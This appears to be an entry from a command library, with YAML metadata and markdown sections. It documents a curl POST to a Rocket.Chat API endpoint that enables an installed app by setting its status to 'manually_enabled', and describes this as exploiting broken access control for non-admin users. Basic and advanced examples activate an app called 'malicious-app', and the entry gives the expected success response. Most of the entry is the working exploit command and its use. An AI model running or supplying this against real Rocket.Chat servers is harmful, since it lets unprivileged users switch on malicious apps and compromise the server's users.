---
id: cmd-uuid-1
data: >-
  curl -X POST http://<rocket-chat-url>/api/apps/<app-id>/status -H
  "Content-Type: application/json" -d '{"status":"manually_enabled"}'
tags:
  - api
  - activation
  - rocket-chat
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.730Z'
verified: false
validated: true
submitted: true
---
# activate-rocket-chat-app-via-api

## Command

```bash
curl -X POST http://<rocket-chat-url>/api/apps/<app-id>/status -H "Content-Type: application/json" -d '{"status":"manually_enabled"}'
```

## Description

This command sends a POST request to the Rocket.Chat API to activate an installed app by setting its status to manually enabled exploiting broken access control for non-admin users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<rocket-chat-url>` | Base URL of the Rocket.Chat instance | Yes |
| `<app-id>` | ID of the installed app from app.json | Yes |
| `status` | Status value in JSON body set to 'manually_enabled' | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://example.com/api/apps/malicious-app/status -H "Content-Type: application/json" -d '{"status":"manually_enabled"}'
```

### Advanced Usage

```bash
curl -X POST http://example.com/api/apps/malicious-app/status -H "Content-Type: application/json" -H "X-Auth-Token: <token>" -H "X-User-Id: <user-id>" -d '{"status":"manually_enabled"}'
```

## Expected Output

A JSON response like {"status":"success" "message":"App activated"} indicating the app is now enabled.

## Related

- [[Related Procedure|Activate-Installed-App-via-API]]
